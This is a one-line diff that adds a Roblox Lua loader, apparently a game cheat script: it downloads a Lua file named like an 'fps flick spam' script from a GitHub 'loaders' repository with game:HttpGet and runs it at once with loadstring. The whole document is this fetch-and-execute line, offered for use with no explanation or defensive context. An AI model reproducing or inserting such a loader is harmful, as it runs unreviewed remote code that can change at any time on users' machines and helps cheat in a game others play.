@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/fps-flick-spam2-of8wbo0livj10k.lua"))()
